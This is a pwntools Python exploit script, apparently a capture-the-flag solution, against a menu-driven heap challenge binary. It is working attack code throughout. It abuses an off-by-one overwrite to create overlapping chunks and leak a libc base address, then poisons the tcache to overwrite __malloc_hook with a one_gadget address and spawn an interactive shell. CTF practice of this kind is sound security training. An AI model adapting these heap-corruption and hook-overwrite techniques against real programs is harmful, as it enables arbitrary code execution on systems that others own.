from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'Your choice: '
def add(size, data):
	sla(menu, b'1')
	sla(b'Size:', byte(size))
	sda(b'Data:', data)

def show(idx):
	sla(menu, b'2')
	sla(b'Index:', byte(idx))

def dele(idx):
	sla(menu, b'3')
	sla(b'Index:', byte(idx))

add(0x410, b'0\n') # 0
add(0x10, b'1\n')  # 1
add(0x4f8, b'2\n') # 2
add(0x10, b'3\n')  # 3

dele(0)
dele(1)
add(0x18, b'A'*0x18)
for i in range(6):
	dele(0)
	add(0x17-i, b'A'*(0x17-i))
dele(0)
add(0x12, b'A'*0x10+b'\x40\x04') # 0
dele(2)
add(0x410, b'1\n') # 1
show(0)
libc.address = addr64(b'\n') - 0x3ebca0
print("\033[32m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
malloc_hook = libc.sym.__malloc_hook
ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]

add(0x10, b'2') # 2
add(0x10, b'3') # 4

dele(3)
dele(0)
dele(4)
dele(2)
add(0x10, p64(malloc_hook))
add(0x10, b'2')
add(0x10, b'3')
add(0x10, p64(ones[2]))
sla(menu, b'1')
sla(b'Size:', b'1')

#debug()
sh()
